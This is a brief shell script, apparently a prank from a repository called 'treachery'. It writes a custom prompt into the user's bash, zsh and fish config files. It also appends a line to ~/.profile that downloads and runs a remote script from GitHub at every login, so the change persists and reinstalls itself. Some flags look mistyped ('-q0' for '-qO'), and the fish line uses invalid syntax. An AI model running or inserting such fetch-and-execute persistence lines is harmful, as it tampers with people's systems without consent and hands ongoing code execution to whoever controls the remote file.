#!/bin/sh

PROMPT="Σ:3 "
echo -n "\nPS1=\"${PROMPT}\"" | tee -a ~/.zshrc | tee -a ~/.bashrc >> ~/.config/fish/config.fish
echo -n 'sh -c "$(wget -q0 - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>.profile
